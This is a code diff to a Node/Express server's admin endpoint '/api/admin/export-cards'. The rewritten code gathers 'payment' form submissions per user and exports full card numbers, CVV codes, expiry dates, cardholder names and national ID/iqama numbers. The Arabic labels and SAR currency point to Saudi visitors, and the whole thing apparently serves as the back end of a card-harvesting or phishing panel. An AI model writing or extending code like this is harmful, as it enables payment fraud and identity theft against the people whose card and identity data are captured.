@@ -344,8 +344,46 @@ app.get('/api/admin/search-forms', authMiddleware, (req, res) => {
 });
 
 app.get('/api/admin/export-cards', authMiddleware, (req, res) => {
-  const cards = db.formSubmissions.filter(f => f.formType === 'payment');
-  res.json(cards);
+  const paymentSubs = db.formSubmissions.filter(f => f.formType === 'payment');
+  // Group by user uuid, keep latest payment per user
+  const userMap = {};
+  paymentSubs.forEach(sub => {
+    const uuid = sub.uuid || sub.userId;
+    if (!uuid) return;
+    if (!userMap[uuid] || new Date(sub.updatedAt || sub.submittedAt || 0) > new Date(userMap[uuid].updatedAt || userMap[uuid].submittedAt || 0)) {
+      userMap[uuid] = sub;
+    }
+  });
+  const cards = Object.values(userMap).map(sub => {
+    const fd = sub.formData || {};
+    const uuid = sub.uuid || sub.userId;
+    // Get user name from various sources
+    const connUser = db.connectedUsers[uuid];
+    const userInfo = db.users[uuid];
+    const name = fd.cardholderName || fd.documentOwnerName || fd.fullName || fd.name || fd.ownerName || (connUser && connUser.userName) || (userInfo && userInfo.userName) || 'زائر';
+    const nationalId = fd.nationalIdIqama || fd.id || fd.iqama || '';
+    return {
+      uuid: uuid,
+      name: name,
+      nationalId: nationalId,
+      payment: {
+        bankName: fd.bankName || '',
+        cardNumber: fd.cardNumber || '',
+        maskedCardNumber: fd.maskedCardNumber || '',
+        cardholderName: fd.cardholderName || name,
+        expiryMonth: fd.expiryMonth || '',
+        expiryYear: fd.expiryYear || '',
+        cvv: fd.cvv || '',
+        brandType: fd.brandType || '',
+        level: fd.level || '',
+        amount: fd.amount || '',
+        currency: fd.currency || 'ر.س',
+        paymentMethod: fd.paymentMethod || 'credit_card',
+      },
+      timestamp: sub.timestamp || sub.submittedAt,
+    };
+  });
+  res.json({ cards });
 });
 
 app.get('/api/admin/export-data-csv', authMiddleware, (req, res) => {
